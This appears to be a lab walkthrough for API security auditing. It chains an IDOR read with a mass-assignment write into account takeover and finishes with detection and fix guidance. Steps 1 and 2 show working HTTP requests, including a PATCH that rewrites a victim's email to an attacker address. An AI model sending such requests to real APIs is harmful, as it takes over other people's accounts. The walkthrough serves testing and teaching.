# Walkthrough: API BOLA-read → account takeover

**Setting:** authorized lab · `api-lab.example` · black-box with two test accounts (User A, User B) · synthetic data.
**Skills:** `api-security-audit` → `vuln-chaining` → `report-writing`.
**Point:** an "info-only" IDOR plus a mass-assignment write together = full account takeover.

## Step 1 — BOLA read (`api-security-audit`, API1)
As User B, request User A's profile object by changing the ID:

```http
GET /api/v1/users/1001 HTTP/1.1
Host: api-lab.example
Authorization: Bearer <userB-token-redacted>     # <== authenticated as User B
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"id":1001,"email":"userA@acme-lab.example","role":"user","emailVerified":true}   # <== EVIDENCE: User B reads User A
```
On its own: "information disclosure, medium."

## Step 2 — Property-level write (`api-security-audit`, API3)
The update endpoint accepts fields the client shouldn't control (mass assignment). Combined with the ID from step 1:

```http
PATCH /api/v1/users/1001 HTTP/1.1
Host: api-lab.example
Authorization: Bearer <userB-token-redacted>
Content-Type: application/json

{"email":"attacker@acme-lab.example"}             # <== PAYLOAD: rewrite victim's email → password reset takeover
```
Benign lab proof: the write succeeds for an object User B does not own.

## Step 3 — Correlate (`vuln-chaining`)
- IDOR-read (primitive: *info disclosure* → gives valid object IDs).
- Missing object-level authz on write (primitive: *arbitrary write*).
- **Compounding:** neither is "critical" alone; chained, they are **account takeover (critical)**.
- **Root cause:** a single missing object-level authorization layer on the `users` resource — the *same* cause behind both. Fix the cause once.

## Step 4 — Report (`report-writing`)
- **Detect:** a principal reading/writing objects whose owner ≠ the authenticated user; email-change events not initiated by the account owner.
- **Fix:** enforce object-level authorization (owner == principal) on every read and write; allow-list writable fields (no direct model binding). *One control closes both.*
- Reproduction test case added so the team can verify the fix and keep a regression check.
